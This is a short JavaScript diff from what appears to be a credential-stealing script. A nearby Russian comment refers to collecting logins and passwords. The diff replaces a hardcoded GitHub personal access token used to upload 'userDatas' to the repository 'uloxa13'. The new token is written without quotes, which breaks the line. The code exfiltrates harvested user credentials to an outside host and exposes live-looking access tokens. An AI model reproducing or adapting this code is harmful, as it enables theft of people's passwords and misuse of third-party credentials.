@@ -63,8 +63,8 @@
         }
     } catch (error) {
     }
-}
-		createGitHubFile('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' + 6, 'uloxa13', 'userDatas').then(url => {const githubFileName = url; console.log(githubFileName);});
+};var half = github_pat_11BHNTEAY04gQ7ua2yjG1b_jLOqk28Vy48S4kE94m5KVkIt6w4WQL4tDdFBmwxWUmJTYZDHOMRDNytOp
+		createGitHubFile(half + 'x1', 'uloxa13', 'userDatas').then(url => {const githubFileName = url; console.log(githubFileName);});
 
 		
         // Функция для сбора логина и пароля
